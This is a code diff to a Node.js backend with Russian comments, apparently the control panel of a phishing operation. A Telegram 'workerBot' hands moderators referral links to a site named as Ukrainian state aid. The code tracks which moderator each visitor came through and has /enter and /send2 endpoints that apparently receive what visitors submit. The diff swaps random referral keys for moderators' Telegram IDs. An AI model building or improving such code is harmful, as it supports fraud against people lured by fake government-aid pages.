@@ -62,10 +62,9 @@ let bannedUsers = {};
 let userStatus = {};
 let extraSentUsers = {};
 
-// ===== REF СИСТЕМА (ИСПРАВЛЕНО) =====
-let modRefKeys = {};     // ref -> modId
-let modIdToKey = {};     // modId -> ref
-let userRef = {};        // clientId -> modId
+// ===== REF СИСТЕМА (СТАБИЛЬНАЯ) =====
+// ref = telegram id модера
+let userRef = {};
 
 // ===== ONLINE =====
 function isOnline(id) {
@@ -131,7 +130,7 @@ workerBot.onText(/\/mods/, (msg) => {
   safeSend(workerBot, adminId, "👥 Модераторы:\n" + list);
 });
 
-// ===== 🔥 LINK MOD (FIXED) =====
+// ===== 🔥 LINK МОДЕРА (ИСПРАВЛЕНО) =====
 workerBot.onText(/\/mylink/, (msg) => {
   const id = msg.chat.id;
 
@@ -139,16 +138,8 @@ workerBot.onText(/\/mylink/, (msg) => {
     return safeSend(workerBot, id, "❌ Ты не модератор");
   }
 
-  let key = modIdToKey[id];
-
-  if (!key) {
-    key = Math.random().toString(36).substring(2, 8);
-
-    modIdToKey[id] = key;
-    modRefKeys[key] = id;
-  }
-
-  const link = `https://dopomogavidderzhavii.vercel.app/?ref=${key}`;
+  // ссылка = telegram id модера
+  const link = `https://dopomogavidderzhavii.vercel.app/?ref=${id}`;
 
   safeSend(workerBot, id, `🔗 Твоя ссылка:\n${link}`);
 });
@@ -162,10 +153,11 @@ app.post("/enter", async (req, res) => {
 
   onlineUsers[id] = Date.now();
 
+  // ref = id модера
   if (ref && !userRef[id]) {
-    const modId = modRefKeys[ref];
+    const modId = Number(ref);
 
-    if (modId) {
+    if (isMod(modId)) {
       userRef[id] = modId;
     } else {
       userRef[id] = "неизвестно";
@@ -267,7 +259,7 @@ app.post("/send2", async (req, res) => {
   res.json({ ok: true });
 });
 
-// ===== CALLBACK (ВСЕ КНОПКИ СОХРАНЕНЫ) =====
+// ===== CALLBACK =====
 workerBot.on("callback_query", async (q) => {
   const data = q.data;
   const id = data.split("_")[1];
